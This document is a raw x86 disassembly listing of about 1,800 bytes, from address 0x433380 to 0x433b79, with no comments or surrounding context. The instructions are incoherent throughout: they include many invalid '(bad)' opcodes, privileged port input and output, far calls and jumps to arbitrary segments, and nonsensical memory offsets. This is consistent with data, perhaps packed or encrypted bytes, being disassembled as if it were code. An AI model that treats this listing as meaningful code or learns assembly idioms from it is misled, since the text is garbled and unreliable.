  433380:	jg     0x4333e2
  433382:	inc    ebx
  433383:	test   eax,0xbd2bcb25
  433388:	pop    eax
  433389:	push   esi
  43338a:	pop    eax
  43338b:	call   0x60bb:0xdd2018ae
  433392:	jmp    0x7ccbdd6d
  433397:	int3   
  433398:	jmp    DWORD PTR [eax+0x49]
  43339b:	push   edi
  43339c:	test   al,0x8b
  43339e:	sub    DWORD PTR [esp+esi*4+0x5efbe5f9],0xdbba5526
  4333a9:	and    ecx,DWORD PTR [ecx-0x2f9f0908]
  4333af:	jne    0x433427
  4333b1:	popa   
  4333b2:	cdq    
  4333b3:	mov    ds:0xa3ee490a,eax
  4333b8:	test   eax,eax
  4333ba:	add    eax,0xede1142e
  4333bf:	test   eax,0x3dee6512
  4333c4:	jo     0x7cc33020
  4333ca:	jmp    0x43335e
  4333cc:	mov    ah,0x2b
  4333ce:	aam    0x86
  4333d0:	push   ss
  4333d1:	fst    DWORD PTR [ebx-0x76]
  4333d4:	sub    esp,DWORD PTR [ecx+0x6c]
  4333d7:	inc    edx
  4333d8:	pop    ebp
  4333d9:	mov    edx,0x296c8f85
  4333de:	out    dx,al
  4333df:	ret    
  4333e0:	cmp    DWORD PTR [ecx],ebp
  4333e2:	jb     0x4333df
  4333e4:	push   esi
  4333e5:	fs add eax,0xb93cb3a1
  4333eb:	(bad)  
  4333ec:	jmp    0x5f0fdeab
  4333f1:	sbb    bh,BYTE PTR [ecx-0x5b]
  4333f4:	mov    ecx,0xcc789064
  4333f9:	pusha  
  4333fa:	ret    
  4333fb:	fmul   QWORD PTR [ebp+0x4f1a5955]
  433401:	push   0x6d3ee6ee
  433406:	inc    eax
  433407:	imul   ebx,DWORD PTR [eax-0x4d5136e1],0x43
  43340e:	inc    edx
  43340f:	(bad)  
  433410:	pop    esi
  433411:	ret    
  433412:	push   esi
  433413:	adc    esp,DWORD PTR [ebp+0x5dc6863c]
  433419:	xor    DWORD PTR [edx+0x40],ecx
  43341c:	push   eax
  43341d:	dec    ecx
  43341e:	mov    bl,0x9c
  433420:	xchg   esi,eax
  433421:	xchg   edx,eax
  433422:	icebp  
  433423:	mov    al,ds:0x6dd97cdc
  433428:	mov    esi,0x5ee1ccff
  43342d:	mov    ebx,0xc74f903a
  433432:	(bad)  
  433433:	push   0x7b0e59fe
  433438:	leave  
  433439:	and    DWORD PTR [edx],0xfffffff8
  43343c:	mov    es,WORD PTR [eax]
  43343e:	xor    esp,DWORD PTR [esp+esi*8]
  433441:	fsubp  st(6),st
  433443:	mov    cs,WORD PTR [edi-0x78]
  433446:	repnz xor dh,al
  433449:	scas   al,BYTE PTR es:[edi]
  43344a:	push   ebp
  43344b:	mov    eax,ds:0x4cdddada
  433450:	int    0x8d
  433452:	clc    
  433453:	out    dx,al
  433454:	addr16 jbe 0x43347e
  433457:	xor    BYTE PTR [ecx+eiz*8],al
  43345a:	dec    edx
  43345b:	lahf   
  43345c:	dec    ebp
  43345d:	jmp    0x220728b6
  433462:	fisub  WORD PTR [eax-0x57790471]
  433468:	xchg   ebp,eax
  433469:	add    dh,BYTE PTR [eax-0x4259af94]
  43346f:	pop    ss
  433470:	pop    ebp
  433471:	jbe    0x43341c
  433473:	out    dx,eax
  433474:	fld    QWORD PTR [eax+0x60ca3b5a]
  43347a:	shr    BYTE PTR [eax+edi*4],cl
  43347d:	data16 cmc 
  43347f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433480:	retf   
  433481:	scas   al,BYTE PTR es:[edi]
  433482:	out    dx,al
  433483:	sub    cl,cl
  433485:	mov    ds:0x64c6c944,eax
  43348a:	lea    esp,[ecx-0x4efc086d]
  433490:	jmp    0x433439
  433492:	dec    edi
  433493:	jns    0x4334f3
  433495:	and    eax,0x15989a4d
  43349a:	pop    ebp
  43349b:	jo     0x433452
  43349d:	pusha  
  43349e:	popf   
  43349f:	sbb    DWORD PTR [ebx-0x2bb1f0ab],esi
  4334a5:	pop    esi
  4334a6:	in     eax,dx
  4334a7:	dec    eax
  4334a8:	mov    eax,0x23c514b8
  4334ad:	and    cl,BYTE PTR [esi+0x1a]
  4334b0:	lock pusha 
  4334b2:	add    DWORD PTR [ecx],0xffffffae
  4334b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4334b6:	fiadd  DWORD PTR [edx]
  4334b8:	pop    ecx
  4334b9:	repnz cmc 
  4334bb:	jb     0x433525
  4334bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4334be:	adc    DWORD PTR [ecx+0x15c5367e],esp
  4334c4:	retf   
  4334c5:	pusha  
  4334c6:	scas   eax,DWORD PTR es:[edi]
  4334c7:	pop    eax
  4334c8:	int    0x70
  4334ca:	stos   DWORD PTR es:[edi],eax
  4334cb:	mov    bh,0x8c
  4334cd:	push   es
  4334ce:	pop    esi
  4334cf:	jl     0x43352f
  4334d1:	or     eax,0x241c53c8
  4334d6:	pushf  
  4334d7:	jecxz  0x433534
  4334d9:	popa   
  4334da:	jl     0x433460
  4334dc:	repnz mov cl,0x10
  4334df:	mov    eax,0x3ceeaa7c
  4334e4:	(bad)  
  4334e5:	rcl    BYTE PTR ds:0xfd695f01,1
  4334eb:	out    dx,eax
  4334ec:	jne    0x43354e
  4334ee:	pop    ebx
  4334ef:	push   edx
  4334f0:	call   0xb933429b
  4334f5:	call   0xc035:0x771fa5ee
  4334fc:	in     al,0xc4
  4334fe:	inc    ebp
  4334ff:	mov    eax,ds:0x374f0df8
  433504:	test   eax,0x5e8e6f17
  433509:	sbb    eax,0xff01ee09
  43350e:	pop    ecx
  43350f:	inc    ebp
  433510:	xlat   BYTE PTR ds:[ebx]
  433511:	pusha  
  433512:	xchg   ebp,eax
  433513:	std    
  433514:	aas    
  433515:	mov    ah,0x1f
  433517:	add    edx,DWORD PTR [edi-0x38]
  43351a:	jmp    0x433579
  43351c:	cmp    al,ch
  43351e:	hlt    
  43351f:	cmp    eax,0x5d0a98c2
  433524:	add    eax,0xbc727661
  433529:	scas   al,BYTE PTR es:[edi]
  43352a:	add    eax,0xeebd2927
  43352f:	inc    edx
  433530:	daa    
  433531:	scas   al,BYTE PTR es:[edi]
  433532:	push   es
  433533:	push   ss
  433534:	xchg   esi,eax
  433535:	mov    ds:0xab42d19a,eax
  43353a:	jnp    0x4334dd
  43353c:	sar    eax,0x58
  43353f:	mov    ds:0x20b41dd7,eax
  433544:	xor    ebp,DWORD PTR [ebx]
  433546:	push   0xd64843a1
  43354b:	jmp    0x43353c
  43354d:	es pop esp
  43354f:	mov    eax,ds:0xb372233
  433554:	or     DWORD PTR [edi-0x1a1713f],0x2ef6275b
  43355e:	jno    0x433509
  433560:	jo     0x4335c2
  433562:	iret   
  433563:	aam    0xa7
  433565:	mov    cl,0xf7
  433567:	sub    eax,0xe7003902
  43356c:	sbb    BYTE PTR [esi+ebp*1-0x2c],0xb6
  433571:	add    DWORD PTR [ecx+0x3e52c5e1],ebx
  433577:	inc    esi
  433578:	fdivr  DWORD PTR [ebp+0x7e2aa198]
  43357e:	repnz arpl WORD PTR [ebp+0x770610b9],ax
  433585:	mov    eax,ds:0x6a242122
  43358a:	mov    edx,0x3b0b8935
  43358f:	lea    esp,[ebp+0x63]
  433592:	xor    bl,bh
  433594:	jae    0x433611
  433596:	dec    esi
  433597:	xchg   edx,eax
  433598:	push   edx
  433599:	popf   
  43359a:	push   0xfffffff2
  43359c:	pop    esi
  43359d:	scas   al,BYTE PTR es:[edi]
  43359e:	test   eax,0x2fc81178
  4335a4:	add    BYTE PTR [ecx-0x3f],ch
  4335a7:	ret    
  4335a8:	fstp   DWORD PTR [ecx]
  4335aa:	xlat   BYTE PTR ds:[ebx]
  4335ab:	xor    al,0x9f
  4335ad:	loopne 0x433570
  4335af:	xor    DWORD PTR [ebx+0x45],ebp
  4335b2:	out    dx,al
  4335b3:	jno    0x43357a
  4335b5:	pushf  
  4335b6:	mov    fs,WORD PTR [edx]
  4335b8:	xchg   edx,eax
  4335b9:	cmp    esi,DWORD PTR [ebp-0x38285a60]
  4335bf:	dec    edi
  4335c0:	inc    esi
  4335c1:	and    eax,0x8f5a9b69
  4335c6:	shl    BYTE PTR [eax],1
  4335c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4335c9:	mov    DWORD PTR [ebp+0x70],ebp
  4335cc:	loop   0x433578
  4335ce:	pop    esi
  4335cf:	loopne 0x4335cc
  4335d1:	pusha  
  4335d2:	imul   ecx,DWORD PTR [ebp-0x11],0xffffff86
  4335d6:	jnp    0x433641
  4335d8:	mov    ah,0xa9
  4335da:	out    dx,al
  4335db:	jns    0x433609
  4335dd:	cdq    
  4335de:	sti    
  4335df:	push   ebx
  4335e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4335e1:	stc    
  4335e2:	mov    dh,0xa0
  4335e4:	(bad)  
  4335e5:	mov    esi,0xe5a83a7e
  4335ea:	enter  0x5e5c,0x98
  4335ee:	jl     0x4335ed
  4335f0:	imul   edx,DWORD PTR gs:[eax+0x7143f993],0x7ae08af5
  4335fb:	push   ss
  4335fc:	rcr    BYTE PTR [edx-0x76a1e7e6],cl
  433602:	push   edx
  433603:	in     al,dx
  433604:	test   al,0x62
  433606:	mov    BYTE PTR [ecx+ebp*8-0x22dc0aa1],0xd5
  43360e:	push   ds
  43360f:	repz aas 
  433611:	cdq    
  433612:	fidivr DWORD PTR [edi+ebx*2-0x27]
  433616:	inc    ecx
  433617:	shl    ebx,0x12
  43361a:	sahf   
  43361b:	sub    edx,esp
  43361d:	retf   0xa204
  433620:	fsubr  QWORD PTR [eax+ebx*1-0x2ac15c97]
  433627:	pusha  
  433628:	icebp  
  433629:	loope  0x433619
  43362b:	iret   
  43362c:	push   cs
  43362d:	fadd   QWORD PTR [ecx-0x43]
  433630:	mov    eax,0x59a115f0
  433635:	in     eax,0x7
  433637:	pop    eax
  433638:	and    eax,0x5e452939
  43363d:	das    
  43363e:	mov    al,ds:0x17b58c25
  433643:	mov    dl,0x94
  433645:	bound  eax,QWORD PTR [ebx]
  433647:	inc    edx
  433648:	shl    DWORD PTR [edi-0x32e4d7cf],1
  43364e:	call   DWORD PTR [ecx-0x4f52a318]
  433654:	dec    edx
  433655:	rcr    BYTE PTR [edx+0x40],cl
  433658:	xor    DWORD PTR [ebp+0x39e4a13f],ebx
  43365e:	out    0xb4,al
  433660:	adc    eax,0xcda285d1
  433665:	mov    edi,0x403f5451
  43366a:	mov    gs,WORD PTR [ebp-0x3e]
  43366d:	stos   BYTE PTR es:[edi],al
  43366e:	out    dx,al
  43366f:	stc    
  433670:	or     dh,BYTE PTR [eax-0x4d]
  433673:	into   
  433674:	addr16 dec ebp
  433676:	add    BYTE PTR [ecx+0x3099e574],ah
  43367c:	pop    eax
  43367d:	pop    ebp
  43367e:	mov    BYTE PTR [edx],al
  433680:	pop    ebx
  433681:	or     cl,BYTE PTR [bp+di-0x6d]
  433685:	scas   al,BYTE PTR es:[edi]
  433686:	sahf   
  433687:	and    BYTE PTR [esi-0x1],bh
  43368a:	fbld   TBYTE PTR [edi+0x4685a348]
  433690:	fbstp  TBYTE PTR [eax+0x48]
  433693:	ret    0x10e8
  433696:	out    dx,al
  433697:	jp     0x433701
  433699:	jo     0x4336fa
  43369b:	mov    esi,DWORD PTR [esi]
  43369d:	xchg   esp,eax
  43369e:	pop    esp
  43369f:	mov    eax,ds:0x78d1fe8c
  4336a4:	lds    eax,FWORD PTR [eax+ebx*4+0x2c793588]
  4336ab:	and    DWORD PTR [ebx+0x64d017be],edx
  4336b1:	jecxz  0x433707
  4336b3:	mov    eax,ds:0xfff61ee5
  4336b8:	(bad)  
  4336ba:	leave  
  4336bb:	sbb    bh,BYTE PTR [eax]
  4336bd:	push   esp
  4336be:	add    DWORD PTR [ecx],esp
  4336c0:	pop    eax
  4336c1:	sti    
  4336c2:	fnstsw WORD PTR [esi+ebp*1+0x68]
  4336c6:	mov    bh,0xa0
  4336c8:	pop    ebx
  4336c9:	out    dx,eax
  4336ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4336cb:	sub    eax,0xe1501abe
  4336d0:	ins    DWORD PTR es:[di],dx
  4336d2:	pop    esi
  4336d3:	jmp    0xd134:0x67d3e0f0
  4336da:	cmc    
  4336db:	test   BYTE PTR [edx],al
  4336dd:	and    eax,0x64a7ac7b
  4336e2:	outs   dx,BYTE PTR ds:[esi]
  4336e3:	mov    cl,0xf5
  4336e5:	push   0xfffffff6
  4336e7:	xchg   ebp,eax
  4336e8:	push   esp
  4336e9:	pop    es
  4336ea:	out    0x9,eax
  4336ec:	push   ecx
  4336ed:	sub    eax,0xe91e5faf
  4336f2:	mov    ch,0x90
  4336f4:	fbld   TBYTE PTR [eax-0x3b]
  4336f7:	cmp    bh,BYTE PTR [esi]
  4336f9:	add    DWORD PTR cs:[esi-0x7c],0xffffffec
  4336fe:	out    dx,al
  4336ff:	call   0x3c1a:0x737ac4a1
  433706:	xor    al,0xa1
  433708:	addr16 push ebx
  43370a:	sub    esp,DWORD PTR [edx]
  43370c:	aaa    
  43370d:	mov    bh,0x8
  43370f:	in     al,dx
  433710:	pop    esi
  433711:	mov    WORD PTR [edx-0x3a],gs
  433714:	pextrw edx,mm1,0xed
  433718:	and    ah,BYTE PTR [ecx+0x42]
  43371b:	call   0x357:0xdde05905
  433722:	in     eax,dx
  433723:	lods   eax,DWORD PTR ds:[esi]
  433724:	adc    dl,BYTE PTR [ecx-0xc4ddc7a]
  43372a:	into   
  43372b:	dec    ebx
  43372c:	ja     0x433751
  43372e:	aaa    
  43372f:	mov    eax,ds:0x3a7ffc0f
  433734:	in     eax,0x74
  433736:	cmc    
  433737:	popf   
  433738:	pop    esi
  433739:	stos   DWORD PTR es:[edi],eax
  43373a:	lahf   
  43373b:	xor    dl,BYTE PTR [eax]
  43373d:	(bad)  
  43373e:	pop    esi
  43373f:	sub    DWORD PTR [eax-0x53],ebp
  433742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433743:	stos   DWORD PTR es:[edi],eax
  433744:	scas   eax,DWORD PTR es:[edi]
  433745:	xchg   ebx,eax
  433746:	out    dx,al
  433747:	(bad)  
  433749:	js     0x4336d8
  43374b:	scas   eax,DWORD PTR es:[edi]
  43374c:	es fucomi st,st(6)
  43374f:	or     eax,ecx
  433751:	int    0x90
  433753:	cmp    DWORD PTR [eax+0x7a],edx
  433756:	ds in  eax,dx
  433758:	repz inc edx
  43375a:	sbb    ch,dh
  43375c:	and    WORD PTR [eax],bx
  43375f:	jle    0x4336fe
  433761:	cmp    ebp,eax
  433763:	inc    edx
  433764:	pop    esi
  433765:	lods   eax,DWORD PTR ds:[esi]
  433766:	jno    0x4336f0
  433768:	pop    DWORD PTR [ebp+0x4a]
  43376b:	mov    ecx,0xd35060c2
  433770:	pushf  
  433771:	outs   dx,BYTE PTR ds:[esi]
  433772:	mov    dh,0xdb
  433774:	fwait
  433775:	shr    dh,cl
  433777:	pop    ecx
  433778:	mov    ebx,0x75be530a
  43377d:	pop    ecx
  43377e:	in     al,0xc6
  433780:	out    0x72,al
  433782:	mov    edx,0xe7ed949e
  433787:	cmp    eax,0x4d75609b
  43378c:	sahf   
  43378d:	jae    0x433807
  43378f:	add    al,0x5e
  433791:	ds xchg edi,eax
  433793:	add    eax,0xa10d48d4
  433798:	arpl   sp,bx
  43379a:	jmp    0x5e5e:0x9cd3271b
  4337a1:	mov    ch,0xbf
  4337a3:	jns    0x4337aa
  4337a5:	mov    ebp,0x6144250a
  4337aa:	rcr    DWORD PTR [eax-0x114ca85a],cl
  4337b0:	test   DWORD PTR [eax-0x12],0x33ba875e
  4337b7:	adc    DWORD PTR [edx+0x73a0bca5],0x4b2b320f
  4337c1:	cld    
  4337c2:	int    0x12
  4337c4:	pop    ebx
  4337c5:	std    
  4337c6:	push   ecx
  4337c7:	dec    edi
  4337c8:	sub    BYTE PTR [esp+edi*4+0x40a0745e],bh
  4337cf:	shl    edi,cl
  4337d1:	pop    esi
  4337d2:	mov    bh,0xb7
  4337d4:	dec    esi
  4337d5:	dec    edx
  4337d6:	daa    
  4337d7:	sbb    eax,0x6e6877fd
  4337dc:	shl    DWORD PTR [eax],0x20
  4337df:	lahf   
  4337e0:	pop    esi
  4337e1:	push   edi
  4337e2:	shr    ebp,cl
  4337e4:	leave  
  4337e5:	and    al,0x40
  4337e7:	xchg   ebp,eax
  4337e8:	inc    ecx
  4337e9:	pusha  
  4337ea:	daa    
  4337eb:	and    edi,eax
  4337ed:	popa   
  4337ee:	out    0x13,al
  4337f0:	shl    BYTE PTR [eax],1
  4337f2:	jg     0x43384b
  4337f4:	sahf   
  4337f5:	push   ecx
  4337f6:	out    dx,al
  4337f7:	imul   ecx,DWORD PTR [ebx+eax*4],0x9d5fca80
  4337fe:	ins    DWORD PTR es:[edi],dx
  4337ff:	ja     0x4337f6
  433801:	pusha  
  433802:	mov    dl,0x6
  433804:	pop    edx
  433805:	inc    esi
  433806:	xor    BYTE PTR [esi+0x56],bl
  433809:	mov    dl,0xee
  43380b:	fisub  DWORD PTR [ebp-0x80]
  43380e:	retf   
  43380f:	sbb    al,0x54
  433811:	div    DWORD PTR [edx]
  433813:	mov    eax,ds:0x81a70b9d
  433818:	sub    DWORD PTR ds:0x385e30ae,edi
  43381e:	(bad)  [eax]
  433820:	cmc    
  433821:	js     0x4337ee
  433823:	rcr    BYTE PTR [ecx+0x61],1
  433826:	bswap  ecx
  433828:	mov    esp,0xfaa88f61
  43382d:	xchg   bl,ch
  43382f:	int3   
  433830:	jne    0x43388c
  433832:	fsub   DWORD PTR [ecx+0x2d2cf0ad]
  433838:	push   ebx
  433839:	popa   
  43383a:	outs   dx,DWORD PTR ds:[esi]
  43383b:	mov    cl,0x77
  43383d:	mov    dl,0x4c
  43383f:	test   al,0x37
  433841:	sub    eax,0xdafef9ed
  433846:	imul   ebp,DWORD PTR [ebx-0x65add0a9],0xffffffb5
  43384d:	pusha  
  43384e:	mov    ?,esp
  433850:	call   0x24cd7631
  433855:	pop    ebp
  433856:	or     ecx,edi
  433858:	fucom  st(0)
  43385a:	pop    ecx
  43385b:	icebp  
  43385c:	xor    eax,0xd2a8b8db
  433861:	dec    ebx
  433862:	in     al,dx
  433863:	mov    ds:0x18b03fa1,al
  433868:	(bad)  
  433869:	mov    ebx,0x65e146c
  43386e:	imul   ebp,DWORD PTR [esp+edx*4],0x6f8b4f9a
  433875:	pusha  
  433876:	out    0x7b,eax
  433878:	adc    al,0xc3
  43387a:	xchg   DWORD PTR [ebx-0x22],esi
  43387d:	dec    ebx
  43387e:	out    0xed,eax
  433880:	aaa    
  433881:	and    eax,0x602ed9fa
  433886:	(bad)  [edi+0x91f10d0]
  43388c:	jmp    0x4338ee
  43388e:	mov    BYTE PTR [esi-0x184044fc],bl
  433894:	lds    eax,FWORD PTR [ebp+0x5c5ed0d7]
  43389a:	push   0xffffffd3
  43389c:	sbb    al,0x49
  43389e:	in     al,dx
  43389f:	pop    es
  4338a0:	or     BYTE PTR [ecx+0xe],ah
  4338a3:	gs dec DWORD PTR es:[ecx+ebp*1+0x7d]
  4338a9:	jmp    0x433839
  4338ab:	xchg   DWORD PTR ds:0x62e6ee21,ebp
  4338b1:	pushf  
  4338b2:	les    edx,FWORD PTR [esi]
  4338b4:	mov    al,ds:0xdba109e3
  4338b9:	xor    al,BYTE PTR [esi+0x4a97d3b4]
  4338bf:	push   ebx
  4338c0:	pop    esi
  4338c1:	icebp  
  4338c2:	jnp    0x43393c
  4338c4:	aaa    
  4338c5:	popf   
  4338c6:	jno    0x433864
  4338c8:	in     eax,0x5d
  4338ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4338cb:	aaa    
  4338cc:	(bad)  
  4338cd:	or     eax,0xe8aee1b7
  4338d2:	and    eax,0xfd315eb2
  4338d7:	jmp    FWORD PTR es:[ecx]
  4338da:	and    al,0x82
  4338dc:	adc    BYTE PTR [ecx+0x69],ah
  4338df:	sbb    al,0xea
  4338e1:	pop    ecx
  4338e2:	enter  0x23d9,0xdf
  4338e6:	in     eax,dx
  4338e7:	pop    ecx
  4338e8:	jb     0x4338a4
  4338ea:	cli    
  4338eb:	sahf   
  4338ec:	ficom  WORD PTR [edi+ecx*1-0x11ac7bcf]
  4338f3:	xor    ah,BYTE PTR [edi+0x31f31fe2]
  4338f9:	int3   
  4338fa:	sbb    bh,BYTE PTR [edi+0x52]
  4338fd:	push   0x12de6099
  433902:	mov    ah,0xd7
  433904:	ins    DWORD PTR es:[edi],dx
  433905:	jnp    0x43389f
  433907:	dec    eax
  433908:	pop    esi
  433909:	les    ecx,FWORD PTR [ebp-0x220917eb]
  43390f:	xchg   edi,eax
  433910:	cmc    
  433911:	pusha  
  433912:	cmp    edx,DWORD PTR [ecx-0xa0512c5]
  433918:	repz call 0x61739e3d
  43391e:	mov    al,ds:0x7e4bdb61
  433923:	ret    
  433924:	mov    bh,0x7b
  433926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433927:	mov    ds:0x8f741f93,eax
  43392c:	push   0x5a
  43392e:	mov    eax,ds:0x9f9068f
  433933:	loope  0x4339af
  433935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433936:	and    eax,0xeeee4920
  43393b:	and    eax,0x9e28e045
  433940:	cmp    al,0x42
  433942:	in     al,dx
  433943:	mov    al,ds:0x8651d2a3
  433948:	xor    al,0xa0
  43394a:	lea    ebx,[ebp-0x15119911]
  433950:	aam    0xc3
  433952:	inc    esi
  433953:	and    BYTE PTR [eax],al
  433955:	dec    edi
  433956:	lds    esp,FWORD PTR [ecx+0x36d25b8a]
  43395c:	test   al,0x28
  43395e:	or     eax,0x5624526d
  433963:	enter  0x2e5e,0xc9
  433967:	sahf   
  433968:	adc    ebp,DWORD PTR [ebp+esi*8+0x57b32237]
  43396f:	test   al,0xd0
  433971:	fwait
  433972:	int3   
  433973:	jmp    0x2b95:0xbcca20c3
  43397a:	out    dx,al
  43397b:	add    BYTE PTR [eax-0x719f064e],cl
  433981:	dec    esi
  433982:	dec    eax
  433983:	mov    eax,ds:0xebbd66d5
  433988:	sti    
  433989:	cmp    bh,BYTE PTR [esi-0x3a25a039]
  43398f:	mov    ah,0x55
  433991:	les    esi,FWORD PTR [esi]
  433993:	test   dh,ch
  433995:	in     eax,0xa9
  433997:	shl    ah,1
  433999:	jle    0x433a11
  43399b:	mov    eax,ds:0xc34a0aa8
  4339a0:	outs   dx,BYTE PTR ds:[esi]
  4339a1:	aas    
  4339a2:	dec    ecx
  4339a3:	sub    ebx,DWORD PTR [esi+0x13]
  4339a6:	sbb    ah,BYTE PTR [ebp+0x5294258b]
  4339ac:	lock pusha 
  4339ae:	sub    al,BYTE PTR [edi+ecx*1]
  4339b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4339b2:	jbe    0x4339f8
  4339b4:	cli    
  4339b5:	adc    bl,dh
  4339b7:	adc    esi,edx
  4339b9:	pop    esp
  4339ba:	bound  esp,QWORD PTR [ecx+0x69ffff86]
  4339c0:	sbb    BYTE PTR [esi-0x61],ah
  4339c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4339c4:	fist   DWORD PTR [edi]
  4339c6:	dec    ebp
  4339c7:	repz in eax,dx
  4339c9:	xor    ch,ch
  4339cb:	lea    edx,[edi+0x8]
  4339ce:	out    dx,al
  4339cf:	jb     0x433966
  4339d1:	push   0x4974aa06
  4339d6:	jg     0x433a47
  4339d8:	scas   eax,DWORD PTR es:[edi]
  4339d9:	pusha  
  4339da:	retf   
  4339db:	xor    BYTE PTR [ecx-0x35],dh
  4339de:	adc    al,0x18
  4339e0:	ja     0x4339eb
  4339e2:	out    dx,al
  4339e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4339e4:	pusha  
  4339e5:	mov    ds:0x9b52c933,al
  4339ea:	shl    DWORD PTR [eax+0x32aee051],0xf4
  4339f1:	xor    ecx,ebx
  4339f3:	daa    
  4339f4:	pop    esi
  4339f5:	ss xor eax,0x7fa99927
  4339fb:	sub    esp,DWORD PTR ds:0x46077261
  433a01:	out    dx,al
  433a02:	or     eax,0xee8e7c6a
  433a07:	fdiv   QWORD PTR [ebx+ecx*8-0x6d7a13ad]
  433a0e:	ins    BYTE PTR es:[edi],dx
  433a0f:	mov    eax,ds:0xac8d9b04
  433a14:	fistp  WORD PTR [esi+0x86581f3]
  433a1a:	aas    
  433a1b:	pop    esi
  433a1c:	ds loopne 0x433a6e
  433a1f:	ins    BYTE PTR es:[edi],dx
  433a20:	pop    ecx
  433a21:	cld    
  433a22:	(bad)  
  433a23:	call   0x16a9b87
  433a28:	aad    0xd9
  433a2a:	std    
  433a2b:	stos   BYTE PTR es:[edi],al
  433a2c:	xchg   ebx,eax
  433a2d:	dec    ebx
  433a2e:	in     eax,dx
  433a2f:	sub    eax,0xe8b625d0
  433a34:	mov    fs,WORD PTR [edx+ecx*2+0x56]
  433a38:	pop    eax
  433a39:	popa   
  433a3a:	mov    ch,0xd0
  433a3c:	cmp    DWORD PTR [esp+ebp*2-0x4623ad0],edx
  433a43:	mov    ?,WORD PTR [ebx-0x2]
  433a46:	out    dx,al
  433a47:	outs   dx,DWORD PTR ds:[esi]
  433a48:	call   0x115ad800
  433a4d:	push   edx
  433a4e:	and    DWORD PTR fs:[esi-0x60ef913a],esp
  433a55:	in     eax,dx
  433a56:	jno    0x433a29
  433a58:	pop    esi
  433a59:	and    ebp,DWORD PTR ds:0xf3abdea
  433a5f:	xor    DWORD PTR [ebx],eax
  433a61:	popa   
  433a62:	stos   DWORD PTR es:[edi],eax
  433a63:	fwait
  433a64:	dec    edi
  433a65:	aad    0xe8
  433a67:	jns    0x433ad6
  433a69:	mov    ah,0xa
  433a6b:	ret    0x1530
  433a6e:	out    dx,al
  433a6f:	scas   eax,DWORD PTR es:[edi]
  433a70:	inc    esi
  433a71:	fst    DWORD PTR [ebx]
  433a73:	pop    eax
  433a74:	jle    0x433ad6
  433a76:	sahf   
  433a77:	jbe    0x433a6b
  433a79:	sub    al,0x9
  433a7b:	adc    edi,esp
  433a7d:	mov    ch,ch
  433a7f:	mov    edx,0x7b7e57f
  433a84:	and    ah,BYTE PTR [ebp+0x6084973a]
  433a8a:	lods   al,BYTE PTR ds:[esi]
  433a8b:	outs   dx,DWORD PTR ds:[esi]
  433a8c:	pop    es
  433a8d:	into   
  433a8e:	in     al,0x39
  433a90:	add    eax,DWORD PTR [edi]
  433a92:	es scas al,BYTE PTR es:[edi]
  433a94:	lea    esp,[eax+0x5c]
  433a97:	adc    BYTE PTR [ebx-0x52266d4a],bh
  433a9d:	and    bl,dh
  433a9f:	mov    al,ds:0xd188a53a
  433aa4:	sar    BYTE PTR [edi+0x475d4b35],cl
  433aaa:	inc    ebp
  433aab:	(bad)  
  433aac:	push   ecx
  433aad:	and    al,0x9c
  433aaf:	fnstsw WORD PTR [edx+0x37]
  433ab2:	leave  
  433ab3:	mov    ds:0xbc685876,eax
  433ab8:	pop    esp
  433ab9:	or     eax,0xc90e0e36
  433abe:	out    dx,al
  433abf:	xor    al,0x79
  433ac1:	in     eax,0xcb
  433ac3:	and    al,0xf7
  433ac5:	mov    fs,WORD PTR [ebx]
  433ac7:	test   ecx,0x6564d943
  433acd:	mov    eax,ds:0xd73e9b67
  433ad2:	jg     0x433a5e
  433ad4:	pop    esi
  433ad5:	test   DWORD PTR [esi+0x2b4e5d0f],edx
  433adb:	les    ecx,FWORD PTR ds:0xea859361
  433ae1:	mov    edi,0x32e3f87a
  433ae6:	out    dx,al
  433ae7:	jne    0x433aad
  433ae9:	pop    ebp
  433aea:	hlt    
  433aeb:	add    BYTE PTR [ebx-0x49],ah
  433aee:	sbb    eax,0x627621a1
  433af3:	push   es
  433af4:	cs jb  0x433a93
  433af7:	std    
  433af8:	ss ja  0x433afc
  433afb:	and    DWORD PTR [edx+0x5073e284],ebp
  433b01:	sbb    DWORD PTR [ecx-0x5f],edi
  433b04:	cmp    cl,bh
  433b06:	cwde   
  433b07:	add    al,0x45
  433b09:	mov    ecx,0x475b1407
  433b0e:	jmp    0x433b47
  433b10:	ss cli 
  433b12:	sahf   
  433b13:	arpl   WORD PTR ds:0x5330fba7,si
  433b19:	and    cl,BYTE PTR [ecx+0x16ba8ca1]
  433b1f:	test   al,0x1b
  433b21:	sub    BYTE PTR [ecx-0x451ea160],ah
  433b27:	xchg   edx,eax
  433b28:	xchg   edx,eax
  433b29:	mov    ds:0x603629d9,eax
  433b2e:	bound  ebx,QWORD PTR [eax]
  433b30:	ror    DWORD PTR [esi+edx*1-0x63],1
  433b34:	dec    esp
  433b35:	xor    DWORD PTR [ebx-0x50],edi
  433b38:	pop    esi
  433b39:	xchg   ebp,eax
  433b3a:	or     DWORD PTR [ebp-0x3431f423],esp
  433b40:	lock pusha 
  433b42:	test   eax,0xe4efe616
  433b47:	mov    esi,0xbb25cf42
  433b4c:	cmp    al,0x58
  433b4e:	(bad)  
  433b4f:	pop    esp
  433b50:	xor    eax,0x32949fe1
  433b55:	loop   0x433aeb
  433b57:	sbb    BYTE PTR [esi],bl
  433b59:	add    esp,DWORD PTR [ebx+ebx*2]
  433b5c:	pop    esi
  433b5d:	xchg   esp,eax
  433b5e:	pushf  
  433b5f:	in     al,dx
  433b60:	icebp  
  433b61:	call   0x6594c23e
  433b66:	push   edx
  433b67:	jne    0x433b1c
  433b69:	push   edx
  433b6a:	ss xchg edi,eax
  433b6c:	pop    esi
  433b6d:	daa    
  433b6e:	in     eax,0x2e
  433b70:	sbb    BYTE PTR [ebx+0x5967063f],al
  433b76:	and    al,0x68
  433b78:	push   ss
  433b79:	loope  0x433b68
